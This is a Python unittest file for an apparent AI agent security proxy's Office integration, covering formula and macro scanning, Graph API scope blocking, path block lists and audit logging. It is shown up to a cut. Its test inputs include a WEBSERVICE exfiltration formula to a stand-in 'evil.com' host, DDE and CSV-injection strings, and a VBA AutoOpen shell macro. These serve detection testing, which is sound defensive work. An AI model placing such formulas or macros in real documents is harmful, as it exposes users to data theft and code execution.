#!/usr/bin/env python3
"""
AIOHAI v3.0 — Microsoft Office Framework Integration Tests
============================================================

Tests all Office-framework additions built on the AIOHAI v3.0 codebase.
Uses only stdlib unittest (no pytest needed).

Run:  python3 -m unittest tests.test_office_framework -v
"""

import os
import sys
import json
import time
import shutil
import tempfile
import unittest
import hashlib
from pathlib import Path
from unittest.mock import MagicMock, patch
from datetime import datetime

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from aiohai.core.types import AlertSeverity, ActionType, ApprovalTier
from aiohai.core.config import UnifiedConfig
from aiohai.core.audit.logger import SecurityLogger
from aiohai.core.audit.alerts import AlertManager
from aiohai.core.access.path_validator import PathValidator
from aiohai.core.access.command_validator import CommandValidator
from aiohai.core.patterns import (
    BLOCKED_PATH_PATTERNS, MACRO_ENABLED_EXTENSIONS,
    SAFE_OFFICE_EXTENSIONS, BLOCKED_EXCEL_FORMULAS,
    BLOCKED_EMBED_EXTENSIONS, BLOCKED_GRAPH_ENDPOINTS,
    BLOCKED_GRAPH_SCOPES,
)
from aiohai.core.templates import AGENTIC_INSTRUCTIONS
from aiohai.proxy.executor import SecureExecutor
from aiohai.integrations.office.document_scanner import DocumentContentScanner
from aiohai.integrations.office.macro_blocker import MacroBlocker
from aiohai.integrations.office.metadata_sanitizer import MetadataSanitizer
from aiohai.integrations.office.graph_registry import GraphAPIRegistry
from aiohai.integrations.office.stack_detector import OfficeStackDetector
from aiohai.integrations.office.audit_logger import DocumentAuditLogger
# Import FIDO2 OperationClassifier if available
try:
    from aiohai.core.crypto.classifier import OperationClassifier
    FIDO2_AVAILABLE = True
except ImportError:
    FIDO2_AVAILABLE = False


# =============================================================================
# Helpers
# =============================================================================

def _make_config(tmp_dir: Path) -> UnifiedConfig:
    (tmp_dir / "policy").mkdir(exist_ok=True)
    (tmp_dir / "logs").mkdir(exist_ok=True)
    (tmp_dir / "temp").mkdir(exist_ok=True)
    (tmp_dir / "data" / "ssl").mkdir(parents=True, exist_ok=True)
    (tmp_dir / "data" / "fido2").mkdir(parents=True, exist_ok=True)

    policy = tmp_dir / "policy" / "aiohai_security_policy_v3.0.md"
    policy.write_text("# AIOHAI Policy v3.0\nDo not harm the user.\n")
    sig = tmp_dir / "policy" / "policy.sig"
    sig.write_bytes(b"\x00" * 64)

    cfg = UnifiedConfig()
    cfg.base_dir = tmp_dir
    cfg.policy_file = policy
    cfg.policy_signature_file = sig
    cfg.log_dir = tmp_dir / "logs"
    cfg.secure_temp_dir = tmp_dir / "temp"
    cfg.listen_host = "127.0.0.1"
    cfg.listen_port = 11435
    cfg.ollama_host = "127.0.0.1"
    cfg.ollama_port = 11434
    cfg.hsm_enabled = False
    cfg.hsm_required = False
    cfg.fido2_enabled = False
    return cfg


# =============================================================================
# 1. DOCUMENT CONTENT SCANNER
# =============================================================================

class TestDocumentContentScanner(unittest.TestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.cfg = _make_config(self.tmp)
        self.logger = SecurityLogger(self.cfg)
        self.scanner = DocumentContentScanner(self.logger)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_clean_content_passes(self):
        result = self.scanner.scan("Hello world. This is a report.", ".docx")
        self.assertTrue(result['safe'])
        self.assertFalse(result['should_block'])
        self.assertEqual(len(result['findings']), 0)

    def test_webservice_formula_blocked(self):
        result = self.scanner.scan('=WEBSERVICE("http://evil.com/steal")', ".xlsx")
        self.assertTrue(result['should_block'])
        self.assertTrue(len(result['formula_issues']) > 0)

    def test_filterxml_formula_blocked(self):
        result = self.scanner.scan('=FILTERXML(WEBSERVICE("http://x"),"/a")', ".xlsx")
        self.assertTrue(result['should_block'])

    def test_dde_formula_blocked(self):
        result = self.scanner.scan("=cmd|'/C calc'!A0", ".xlsx")
        self.assertTrue(result['should_block'])

    def test_rtd_formula_blocked(self):
        result = self.scanner.scan('=RTD("progid",,"topic1")', ".xlsx")
        self.assertTrue(result['should_block'])

    def test_safe_formulas_pass(self):
        content = '=SUM(A1:A10)\n=AVERAGE(B1:B10)\n=IF(C1>0,"yes","no")'
        result = self.scanner.scan(content, ".xlsx")
        self.assertEqual(len(result['formula_issues']), 0)

    def test_csv_injection_detected(self):
        content = '=cmd|something,value2\n+cmd|test,value3\n@SUM(A1),normal'
        result = self.scanner.scan(content, ".csv")
        self.assertTrue(len(result['findings']) > 0)
        csv_findings = [f for f in result['findings'] if f['type'] == 'csv_injection_risk']
        self.assertTrue(len(csv_findings) > 0)

    def test_negative_numbers_not_flagged(self):
        content = '-100,200\n-3.14,6.28\n-0.5,0.5'
        result = self.scanner.scan(content, ".csv")
        csv_findings = [f for f in result['findings'] if f['type'] == 'csv_injection_risk']
        self.assertEqual(len(csv_findings), 0)

    def test_external_url_detected(self):
        result = self.scanner.scan("Visit https://evil.com/exfil for data", ".docx")
        self.assertTrue(len(result['external_refs']) > 0)

    def test_localhost_url_not_flagged(self):
        result = self.scanner.scan("API at http://127.0.0.1:8123/api", ".docx")
        self.assertEqual(len(result['external_refs']), 0)

    def test_unc_path_detected(self):
        result = self.scanner.scan(r"='\\server\share\file.xlsx'!A1", ".xlsx")
        self.assertTrue(len(result['external_refs']) > 0)

    def test_scan_summary_clean(self):
        result = self.scanner.scan("Clean content", ".docx")
        summary = self.scanner.get_scan_summary(result)
        self.assertIn("clean", summary.lower())

    def test_scan_summary_blocked(self):
        result = self.scanner.scan('=WEBSERVICE("http://evil.com")', ".xlsx")
        summary = self.scanner.get_scan_summary(result)
        self.assertIn("blocked", summary.lower())

    def test_formulas_not_checked_for_docx(self):
        """Formula scanning should only trigger for spreadsheet types."""
        result = self.scanner.scan('=WEBSERVICE("http://evil.com")', ".docx")
        self.assertEqual(len(result['formula_issues']), 0)

    def test_with_pii_protector(self):
        """Scanner with PIIProtector should detect PII."""
        try:
            from aiohai.core.analysis.pii_protector import PIIProtector
            pii = PIIProtector()
            scanner = DocumentContentScanner(self.logger, pii_protector=pii)
            result = scanner.scan("My SSN is 123-45-6789", ".docx")
            self.assertTrue(len(result['pii_findings']) > 0)
            self.assertTrue(result['should_block'])
        except Exception:
            self.skipTest("PIIProtector not available")


# =============================================================================
# 2. MACRO BLOCKER
# =============================================================================

class TestMacroBlocker(unittest.TestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.cfg = _make_config(self.tmp)
        self.logger = SecurityLogger(self.cfg)
        self.blocker = MacroBlocker(self.logger)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_xlsm_blocked(self):
        ok, reason = self.blocker.check_extension("report.xlsm")
        self.assertFalse(ok)
        self.assertIn(".xlsx", reason)

    def test_docm_blocked(self):
        ok, reason = self.blocker.check_extension("letter.docm")
        self.assertFalse(ok)
        self.assertIn(".docx", reason)

    def test_pptm_blocked(self):
        ok, reason = self.blocker.check_extension("deck.pptm")
        self.assertFalse(ok)
        self.assertIn(".pptx", reason)

    def test_dotm_blocked(self):
        ok, reason = self.blocker.check_extension("template.dotm")
        self.assertFalse(ok)

    def test_xlsb_blocked(self):
        ok, reason = self.blocker.check_extension("data.xlsb")
        self.assertFalse(ok)

    def test_xlsx_allowed(self):
        ok, reason = self.blocker.check_extension("report.xlsx")
        self.assertTrue(ok)

    def test_docx_allowed(self):
        ok, reason = self.blocker.check_extension("letter.docx")
        self.assertTrue(ok)

    def test_pptx_allowed(self):
        ok, reason = self.blocker.check_extension("deck.pptx")
        self.assertTrue(ok)

    def test_csv_allowed(self):
        ok, reason = self.blocker.check_extension("data.csv")
        self.assertTrue(ok)

    def test_all_macro_extensions_blocked(self):
        for ext in MACRO_ENABLED_EXTENSIONS:
            ok, _ = self.blocker.check_extension(f"test{ext}")
            self.assertFalse(ok, f"Macro extension {ext} should be blocked")

    def test_all_safe_extensions_allowed(self):
        for ext in SAFE_OFFICE_EXTENSIONS:
            ok, _ = self.blocker.check_extension(f"test{ext}")
            self.assertTrue(ok, f"Safe extension {ext} should be allowed")

    def test_vba_sub_detected(self):
        content = 'Sub AutoOpen()\n  Shell "cmd /c calc"\nEnd Sub'
        ok, reason = self.blocker.scan_content_for_vba(content)
        self.assertFalse(ok)
        self.assertIn("VBA", reason)

    def test_vba_createobject_detected(self):
        content = 'Set ws = CreateObject("WScript.Shell")'
        ok, reason = self.blocker.scan_content_for_vba(content)
        self.assertFalse(ok)

    def test_vba_autoopen_detected(self):
        content = 'Private Sub Workbook_Open()\n  MsgBox "hi"\nEnd Sub'
        ok, reason = self.blocker.scan_content_for_vba(content)
        self.assertFalse(ok)

    def test_clean_python_passes(self):
        content = 'def create_report():\n    doc = Document()\n    doc.save("out.docx")'
        ok, reason = self.blocker.scan_content_for_vba(content)
        self.assertTrue(ok)

    def test_wscript_command_blocked(self):
        ok, reason = self.blocker.check_command_for_macro_execution("wscript macro.vbs")
        self.assertFalse(ok)

    def test_cscript_command_blocked(self):
        ok, reason = self.blocker.check_command_for_macro_execution("cscript //nologo test.vbs")
        self.assertFalse(ok)

    def test_word_macro_switch_blocked(self):
        ok, reason = self.blocker.check_command_for_macro_execution("winword /m macro_name")
        self.assertFalse(ok)

    def test_normal_python_command_passes(self):
        ok, reason = self.blocker.check_command_for_macro_execution("python3 create_report.py")
        self.assertTrue(ok)


# =============================================================================
# 3. METADATA SANITIZER
# =============================================================================

class TestMetadataSanitizer(unittest.TestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.cfg = _make_config(self.tmp)
        self.logger = SecurityLogger(self.cfg)
        self.sanitizer = MetadataSanitizer(self.logger)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_docx_sanitize_method_exists(self):
        """sanitize_file should handle .docx files via _sanitize_docx."""
        self.assertTrue(hasattr(self.sanitizer, 'sanitize_file'))
        self.assertTrue(hasattr(self.sanitizer, '_sanitize_docx'))

    def test_xlsx_sanitize_method_exists(self):
        """sanitize_file should handle .xlsx files via _sanitize_xlsx."""
        self.assertTrue(hasattr(self.sanitizer, '_sanitize_xlsx'))

    def test_pptx_sanitize_method_exists(self):
        """sanitize_file should handle .pptx files via _sanitize_pptx."""
        self.assertTrue(hasattr(self.sanitizer, '_sanitize_pptx'))

    def test_unknown_extension_returns_true(self):
        """sanitize_file should return True (no-op) for unknown extensions."""
        result = self.sanitizer.sanitize_file("file.xyz", ".xyz")
        self.assertTrue(result)

    def test_record_sanitization_increments(self):
        self.assertEqual(self.sanitizer._sanitized_count, 0)
        self.sanitizer.record_sanitization("file1.docx")
        self.assertEqual(self.sanitizer._sanitized_count, 1)
        self.sanitizer.record_sanitization("file2.xlsx")
        self.assertEqual(self.sanitizer._sanitized_count, 2)


# =============================================================================
# 4. GRAPH API REGISTRY
# =============================================================================

class TestGraphAPIRegistry(unittest.TestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.cfg = _make_config(self.tmp)
        self.logger = SecurityLogger(self.cfg)
        self.registry = GraphAPIRegistry(self.logger, config={
            'scopes': ['Files.Read', 'Files.ReadWrite'],
        })

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_file_search_allowed(self):
        ok, tier, svc = self.registry.validate_request(
            "GET", "/me/drive/search(q='report')")
        self.assertTrue(ok)

    def test_file_list_allowed(self):
        ok, tier, svc = self.registry.validate_request(
            "GET", "/me/drive/root/children")
        self.assertTrue(ok)
        self.assertEqual(tier, "TIER_2")  # standard → TIER_2

    def test_file_content_elevated(self):
        ok, tier, svc = self.registry.validate_request(
            "GET", "/me/drive/items/abc123/content")
        self.assertTrue(ok)
        self.assertEqual(tier, "TIER_2")  # elevated → TIER_2

    def test_file_upload_critical(self):
        ok, tier, svc = self.registry.validate_request(
            "PUT", "/me/drive/items/abc123/content")
        self.assertTrue(ok)
        self.assertEqual(tier, "TIER_3")  # critical → TIER_3

    def test_send_mail_blocked(self):
        ok, reason, _ = self.registry.validate_request(
            "POST", "/me/sendMail")
        self.assertFalse(ok)
        self.assertIn("blocked", reason.lower())

    def test_file_invite_blocked(self):
        ok, reason, _ = self.registry.validate_request(
            "POST", "/me/drive/items/abc123/invite")
        self.assertFalse(ok)

    def test_admin_endpoint_blocked(self):
        ok, reason, _ = self.registry.validate_request(
            "GET", "/admin/serviceAnnouncement/messages")
        self.assertFalse(ok)

    def test_directory_endpoint_blocked(self):
        ok, reason, _ = self.registry.validate_request(
            "PATCH", "/directory/deletedItems/abc123")
        self.assertFalse(ok)

    def test_dangerous_scope_blocked(self):
        ok, reason, _ = self.registry.validate_request(
            "GET", "/me/drive/root/children",
            token_scopes={'Files.Read', 'Mail.Send'})
        self.assertFalse(ok)
        self.assertIn("Mail.Send", reason)

    def test_safe_scopes_allowed(self):
        ok, tier, _ = self.registry.validate_request(
            "GET", "/me/drive/root/children",
            token_scopes={'Files.Read'})
        self.assertTrue(ok)

    def test_validate_scopes_safe(self):
        safe, blocked = self.registry.validate_scopes({'Files.Read', 'Files.ReadWrite'})
        self.assertTrue(safe)
        self.assertEqual(blocked, [])

    def test_validate_scopes_dangerous(self):
        safe, blocked = self.registry.validate_scopes(
            {'Files.Read', 'Directory.ReadWrite.All', 'Mail.Send'})
        self.assertFalse(safe)
        self.assertIn('Mail.Send', blocked)
        self.assertIn('Directory.ReadWrite.All', blocked)

    def test_unknown_endpoint_defaults_to_tier2(self):
        ok, tier, _ = self.registry.validate_request(
            "GET", "/me/someNewEndpoint")
        self.assertTrue(ok)
        self.assertEqual(tier, "TIER_2")  # unknown → elevated → TIER_2


# =============================================================================
# 5. OFFICE PATH PATTERNS
# =============================================================================

class TestOfficePathPatterns(unittest.TestCase):
    """Verify Office-specific blocked path patterns are in the main BLOCKED list."""

    def test_main_blocked_list_includes_office(self):
        """Office patterns must be merged into main BLOCKED_PATH_PATTERNS."""
        import re
        combined = '\n'.join(BLOCKED_PATH_PATTERNS)
        self.assertIn('templates', combined.lower())
        self.assertIn('xlstart', combined.lower())
        self.assertIn('normal', combined.lower())
        self.assertIn('.pst', combined.lower())

    def test_normal_dotm_blocked(self):
        import re
        path = r'C:\Users\test\AppData\Roaming\Microsoft\Templates\Normal.dotm'
        blocked = any(re.match(p, path) for p in BLOCKED_PATH_PATTERNS)
        self.assertTrue(blocked, "Normal.dotm should be blocked by PathValidator")

    def test_personal_xlsb_blocked(self):
        import re
        path = r'C:\Users\test\AppData\Roaming\Microsoft\Excel\XLSTART\Personal.xlsb'
        blocked = any(re.match(p, path) for p in BLOCKED_PATH_PATTERNS)
        self.assertTrue(blocked, "Personal.xlsb should be blocked by PathValidator")

    def test_pst_blocked(self):
        import re
        path = r'C:\Users\test\Documents\Outlook\archive.pst'
        blocked = any(re.match(p, path) for p in BLOCKED_PATH_PATTERNS)
        self.assertTrue(blocked, ".pst files should be blocked by PathValidator")

    def test_ost_blocked(self):
        import re
        path = r'C:\Users\test\AppData\Local\Microsoft\Outlook\test@email.ost'
        blocked = any(re.match(p, path) for p in BLOCKED_PATH_PATTERNS)
        self.assertTrue(blocked, ".ost files should be blocked by PathValidator")

    def test_normal_docx_not_blocked(self):
        import re
        path = r'C:\Users\test\Documents\report.docx'
        blocked = any(re.match(p, path) for p in BLOCKED_PATH_PATTERNS)
        self.assertFalse(blocked, "Normal docx should not be blocked")

    def test_office_mru_blocked(self):
        import re
        path = r'C:\Users\test\AppData\Roaming\Microsoft\Office\Recent\report.lnk'
        blocked = any(re.match(p, path) for p in BLOCKED_PATH_PATTERNS)
        self.assertTrue(blocked, "Office MRU directory should be blocked")


# =============================================================================
# 6. EXTENSION CONSTANTS
# =============================================================================

class TestExtensionConstants(unittest.TestCase):

    def test_macro_extensions_are_frozenset(self):
        self.assertIsInstance(MACRO_ENABLED_EXTENSIONS, frozenset)

    def test_safe_extensions_are_frozenset(self):
        self.assertIsInstance(SAFE_OFFICE_EXTENSIONS, frozenset)

    def test_no_overlap(self):
        """Macro and safe sets must not overlap."""
        overlap = MACRO_ENABLED_EXTENSIONS & SAFE_OFFICE_EXTENSIONS
        self.assertEqual(len(overlap), 0, f"Overlapping extensions: {overlap}")

    def test_blocked_embed_extensions(self):
        for ext in ('.exe', '.dll', '.bat', '.ps1', '.vbs', '.js', '.scr'):
            self.assertIn(ext, BLOCKED_EMBED_EXTENSIONS)

    def test_safe_embed_types_not_blocked(self):
        for ext in ('.pdf', '.png', '.jpg', '.txt', '.csv'):
            self.assertNotIn(ext, BLOCKED_EMBED_EXTENSIONS)


# =============================================================================
# 7. OFFICE STACK DETECTOR
# =============================================================================

class TestOfficeStackDetector(unittest.TestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_detects_no_libs(self):
        with patch.dict('sys.modules', {
            'docx': None, 'openpyxl': None, 'pptx': None
        }):
            det = OfficeStackDetector(base_dir=str(self.tmp))
            det._cache = None  # Force fresh detection
            # Can't easily mock __import__, so just test the structure
            result = det.detect()
            self.assertIn('detection_state', result)
            self.assertIn('libraries', result)
            self.assertIn('office_apps', result)
            self.assertIn('document_directories', result)
            self.assertIn('graph_api', result)

    def test_uses_aiohai_env_var(self):
        with patch.dict(os.environ, {'AIOHAI_HOME': str(self.tmp)}):
            det = OfficeStackDetector()
            self.assertEqual(det.base_dir, self.tmp)

    def test_caching(self):
        det = OfficeStackDetector(base_dir=str(self.tmp))
        r1 = det.detect()
        r2 = det.detect()
        self.assertIs(r1, r2, "Second call should return cached result")

    def test_cache_invalidation(self):
        det = OfficeStackDetector(base_dir=str(self.tmp))
        r1 = det.detect()
        det._cache_time = time.time() - 300
        r2 = det.detect()
        self.assertIsNot(r1, r2, "Expired cache should produce new result")

    def test_context_block_format(self):
        det = OfficeStackDetector(base_dir=str(self.tmp))
        block = det.get_context_block()
        self.assertIn("[OFFICE_STATUS]", block)
        self.assertIn("[/OFFICE_STATUS]", block)
        self.assertIn("detection_state:", block)
        self.assertIn("libraries:", block)
        self.assertIn("graph_api:", block)

    def test_graph_config_detection(self):
        """Should detect Graph API config file."""
        config_dir = self.tmp / 'config'
        config_dir.mkdir()
        graph_config = config_dir / 'graph_api.json'
        graph_config.write_text(json.dumps({
            'tenant_id': 'test-tenant',
            'client_id': 'test-client',
            'scopes': ['Files.Read'],
        }))

        det = OfficeStackDetector(base_dir=str(self.tmp))
        result = det.detect()
        self.assertTrue(result['graph_api']['configured'])
        self.assertEqual(result['graph_api']['tenant_id'], '[set]')

    def test_doc_dirs_detected(self):
        det = OfficeStackDetector(base_dir=str(self.tmp))
        result = det.detect()
        dirs = result['document_directories']
        self.assertIn('documents', dirs)
        self.assertIn('desktop', dirs)
        self.assertIn('downloads', dirs)


# =============================================================================
# 8. DOCUMENT AUDIT LOGGER
# =============================================================================

class TestDocumentAuditLogger(unittest.TestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.log_dir = self.tmp / 'doc_audit'
        self.audit = DocumentAuditLogger(
            log_dir=self.log_dir, retention_days=30,
            log_content_hashes=True,
        )

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_log_dir_created(self):
        self.assertTrue(self.log_dir.exists())

    def test_log_operation_creates_entry(self):
        entry = self.audit.log_operation(
            'CREATE', 'C:\\Users\\test\\Documents\\report.docx',
            file_type='.docx',
        )
        self.assertEqual(entry['operation'], 'CREATE')
        self.assertEqual(entry['file_type'], '.docx')
        self.assertIn('timestamp', entry)

    def test_log_file_created(self):
        self.audit.log_operation('CREATE', 'test.docx')
        date_str = datetime.now().strftime('%Y-%m-%d')
        log_file = self.log_dir / f'doc_audit_{date_str}.jsonl'
        self.assertTrue(log_file.exists())

    def test_log_content_is_valid_json(self):
        self.audit.log_operation('READ', 'test.xlsx', file_type='.xlsx')
        date_str = datetime.now().strftime('%Y-%m-%d')
        log_file = self.log_dir / f'doc_audit_{date_str}.jsonl'
        with open(log_file) as f:
            for line in f:
                entry = json.loads(line)
                self.assertIn('operation', entry)

    def test_pii_findings_logged(self):
        entry = self.audit.log_operation(
            'CREATE', 'test.docx',
            pii_findings=[
                {'type': 'ssn', 'value': '***'},
                {'type': 'email', 'value': '***'},
            ],
        )
        self.assertEqual(entry['pii_findings_count'], 2)
        self.assertIn('ssn', entry['pii_categories'])
        self.assertIn('email', entry['pii_categories'])

    def test_content_hash(self):
        h = self.audit.hash_content(b"Hello world document content")
        self.assertEqual(len(h), 64)  # SHA-256 hex

    def test_content_hash_disabled(self):
        audit = DocumentAuditLogger(
            log_dir=self.tmp / 'other', log_content_hashes=False)
        h = audit.hash_content(b"content")
        self.assertEqual(h, '')

    def test_get_recent(self):
        for i in range(5):
            self.audit.log_operation('CREATE', f'file_{i}.docx')
        recent = self.audit.get_recent(3)
        self.assertEqual(len(recent), 3)

    def test_get_stats(self):
        self.audit.log_operation('CREATE', 'a.docx', file_type='.docx')
        self.audit.log_operation('READ', 'b.xlsx', file_type='.xlsx')
        self.audit.log_operation('CREATE', 'c.docx', file_type='.docx')
        stats = self.audit.get_stats()
        self.assertEqual(stats['total_operations'], 3)
        self.assertEqual(stats['by_operation']['CREATE'], 2)
        self.assertEqual(stats['by_operation']['READ'], 1)

    def test_recent_cap_at_max(self):
        for i in range(150):
            self.audit.log_operation('CREATE', f'file_{i}.docx')
        self.assertLessEqual(len(self.audit._recent), 100)


# =============================================================================
# 9. ACTION TYPE ENUM
# =============================================================================

class TestDocumentOpActionType(unittest.TestCase):

    def test_document_op_exists(self):
        self.assertTrue(hasattr(ActionType, 'DOCUMENT_OP'))

    def test_all_original_types_preserved(self):
        for name in ('FILE_READ', 'FILE_WRITE', 'FILE_DELETE',
                      'COMMAND_EXEC', 'DIRECTORY_LIST', 'NETWORK_REQUEST',
                      'LOCAL_API_QUERY'):
            self.assertTrue(hasattr(ActionType, name), f"Missing: {name}")


# =============================================================================
# 10. AGENTIC INSTRUCTIONS
# =============================================================================

class TestAgenticInstructionsOffice(unittest.TestCase):

    def test_document_op_referenced(self):
        self.assertIn("Document Operations", AGENTIC_INSTRUCTIONS)

    def test_macro_rule_present(self):
        self.assertIn("macro-enabled", AGENTIC_INSTRUCTIONS.lower())

    def test_pii_scanning_rule(self):
        self.assertIn("PII scanning", AGENTIC_INSTRUCTIONS)

    def test_metadata_stripping_rule(self):
        self.assertIn("metadata stripped", AGENTIC_INSTRUCTIONS)

    def test_template_directory_rule(self):
        self.assertIn("template directories", AGENTIC_INSTRUCTIONS.lower())

    def test_formula_safety_rule(self):
        self.assertIn("WEBSERVICE", AGENTIC_INSTRUCTIONS)

    def test_office_framework_reference(self):
        self.assertIn("Microsoft Office Orchestration Framework", AGENTIC_INSTRUCTIONS)

    def test_graph_api_referenced(self):
        self.assertIn("Graph API", AGENTIC_INSTRUCTIONS)

    def test_rules_9_through_14(self):
        for i in range(9, 15):
            self.assertIn(f"{i}.", AGENTIC_INSTRUCTIONS,
                          f"Rule {i} not found in AGENTIC_INSTRUCTIONS")


# =============================================================================
# 11. CONFIG SCHEMA
# =============================================================================

class TestConfigSchemaOffice(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        config_path = PROJECT_ROOT / 'config' / 'config.json'
        with open(config_path) as f:
            cls.config = json.load(f)

    def test_office_section_exists(self):
        self.assertIn('office', self.config)

    def test_office_enabled(self):
        self.assertTrue(self.config['office']['enabled'])

    def test_local_config(self):
        local = self.config['office']['local']
        self.assertTrue(local['enabled'])
        self.assertTrue(local['pii_scan_on_write'])
        self.assertTrue(local['metadata_sanitize'])
        self.assertEqual(local['max_document_size_mb'], 50)

    def test_blocked_extensions_in_config(self):
        blocked = self.config['office']['local']['blocked_extensions_write']
        for ext in ['.xlsm', '.docm', '.pptm', '.dotm', '.xlsb']:
            self.assertIn(ext, blocked)

    def test_graph_api_config(self):
        graph = self.config['office']['graph_api']
        self.assertFalse(graph['enabled'])  # Default off
        self.assertIn('Files.Read', graph['scopes'])
        self.assertIn('Mail.Send', graph['blocked_scopes'])

    def test_audit_config(self):
        audit = self.config['office']['audit']
        self.assertTrue(audit['enabled'])
        self.assertEqual(audit['retention_days'], 30)
        self.assertTrue(audit['log_content_hashes'])

    def test_schema_still_aiohai_v3(self):
        self.assertEqual(self.config['$schema'], 'AIOHAI Configuration v3.0')

    def test_smart_home_still_present(self):
        """Adding office must not remove smart_home."""
        self.assertIn('smart_home', self.config)


# =============================================================================
# 12. FRAMEWORK FILE
# =============================================================================

class TestOfficeFrameworkFile(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.fw_path = PROJECT_ROOT / 'policy' / 'office_framework_v3.md'
        if cls.fw_path.exists():
            cls.content = cls.fw_path.read_text(encoding='utf-8')
        else:
            cls.content = None

    def test_file_exists(self):
        self.assertTrue(self.fw_path.exists())

    def test_matches_glob_pattern(self):
        self.assertRegex(self.fw_path.name, r'.*_framework_.*\.md')

    def test_has_office_status_block(self):
        self.assertIn('[OFFICE_STATUS]', self.content)

    def test_has_pii_section(self):
        self.assertIn('PII', self.content)

    def test_has_metadata_section(self):
        self.assertIn('MetadataSanitizer', self.content)

    def test_has_macro_rules(self):
        self.assertIn('Macro', self.content)

    def test_has_graph_api_section(self):
        self.assertIn('Graph API', self.content)

    def test_has_constraint_rules(self):
        # v3 uses "What you must NEVER do" section instead of numbered rules
        self.assertIn('NEVER', self.content)
        self.assertIn('Never create macro-enabled', self.content)

    def test_has_word_procedures(self):
        self.assertIn('python-docx', self.content)

    def test_has_excel_procedures(self):
        self.assertIn('openpyxl', self.content)

    def test_has_powerpoint_procedures(self):
        self.assertIn('python-pptx', self.content)

    def test_no_old_naming(self):
        for old in ('SecureLLM', 'securellm', 'secure_llm'):
            self.assertNotIn(old, self.content, f"Old naming: {old}")

    def test_has_csv_injection_prevention(self):
        self.assertIn('CSV injection', self.content)

    def test_blocked_formulas_documented(self):
        for formula in ('WEBSERVICE', 'FILTERXML', 'RTD', 'SQL.REQUEST'):
            self.assertIn(formula, self.content)


# =============================================================================
# 13. BLOCKED GRAPH SCOPES
# =============================================================================

class TestBlockedGraphScopes(unittest.TestCase):

    def test_mail_send_blocked(self):
        self.assertIn('Mail.Send', BLOCKED_GRAPH_SCOPES)

    def test_directory_write_blocked(self):
        self.assertIn('Directory.ReadWrite.All', BLOCKED_GRAPH_SCOPES)

    def test_sites_fullcontrol_blocked(self):
        self.assertIn('Sites.FullControl.All', BLOCKED_GRAPH_SCOPES)

    def test_read_scopes_not_blocked(self):
        self.assertNotIn('Files.Read', BLOCKED_GRAPH_SCOPES)
        self.assertNotIn('Files.ReadWrite', BLOCKED_GRAPH_SCOPES)


# =============================================================================
# 14. FRAMEWORK LOADING (both frameworks discovered)
# =============================================================================

class TestBothFrameworksLoad(unittest.TestCase):

    def test_glob_finds_both_frameworks(self):
        policy_dir = PROJECT_ROOT / 'policy'
        found = sorted(policy_dir.glob('*_framework_*.md'))
        names = [f.name for f in found]
        self.assertIn('ha_framework_v3.md', names)
        self.assertIn('office_framework_v3.md', names)
        self.assertEqual(len(found), 2)


# =============================================================================
# 15. NO OLD NAMING IN NEW FILES
# =============================================================================

class TestNoOldNamingOffice(unittest.TestCase):

    def test_no_securellm_in_office_framework(self):
        fw = PROJECT_ROOT / 'policy' / 'office_framework_v3.md'
        content = fw.read_text(encoding='utf-8')
        for old in ('SecureLLM', 'securellm', 'secure_llm'):
            self.assertNotIn(old, content)

    def test_no_securellm_in_config(self):
        with open(PROJECT_ROOT / 'config' / 'config.json') as f:
            content = f.read()
        for old in ('SecureLLM', 'securellm', 'secure_llm'):
            self.assertNotIn(old, content)


# =============================================================================
# 16. TIER INTEGRATION: OperationClassifier DOCUMENT_OP
# =============================================================================

@unittest.skipUnless(FIDO2_AVAILABLE, "FIDO2 module not available")
class TestOperationClassifierDocumentOp(unittest.TestCase):
    """Verify DOCUMENT_OP is classified into the correct FIDO2 tiers."""

    def test_normal_docx_is_tier2(self):
        tier = OperationClassifier.classify('DOCUMENT_OP', 'report.docx')
        self.assertEqual(tier, ApprovalTier.TIER_2)

    def test_normal_xlsx_is_tier2(self):
        tier = OperationClassifier.classify('DOCUMENT_OP', 'data.xlsx')
        self.assertEqual(tier, ApprovalTier.TIER_2)

    def test_normal_pptx_is_tier2(self):
        tier = OperationClassifier.classify('DOCUMENT_OP', 'deck.pptx')
        self.assertEqual(tier, ApprovalTier.TIER_2)

    def test_payroll_escalates_to_tier3(self):
        tier = OperationClassifier.classify('DOCUMENT_OP', 'payroll_q4.xlsx')
        self.assertEqual(tier, ApprovalTier.TIER_3)

    def test_employee_review_escalates_to_tier3(self):
        tier = OperationClassifier.classify('DOCUMENT_OP', 'employee_hr_review.docx')
        self.assertEqual(tier, ApprovalTier.TIER_3)

    def test_medical_escalates_to_tier3(self):
        tier = OperationClassifier.classify('DOCUMENT_OP', 'medical_records.xlsx')
        self.assertEqual(tier, ApprovalTier.TIER_3)

    def test_tax_escalates_to_tier3(self):
        tier = OperationClassifier.classify('DOCUMENT_OP', 'tax_return_2025.xlsx')
        self.assertEqual(tier, ApprovalTier.TIER_3)

    def test_contract_escalates_to_tier3(self):
        tier = OperationClassifier.classify('DOCUMENT_OP', 'nda_contract_vendor.docx')
        self.assertEqual(tier, ApprovalTier.TIER_3)

    def test_confidential_escalates_to_tier3(self):
        tier = OperationClassifier.classify('DOCUMENT_OP', 'confidential_report.pptx')
        self.assertEqual(tier, ApprovalTier.TIER_3)

    def test_customer_list_escalates_to_tier3(self):
        tier = OperationClassifier.classify('DOCUMENT_OP', 'customer_list_export.csv')
        self.assertEqual(tier, ApprovalTier.TIER_3)

    def test_original_types_still_work(self):
        """Existing classifications must not be broken."""
        self.assertEqual(OperationClassifier.classify('DELETE', 'file.txt'),
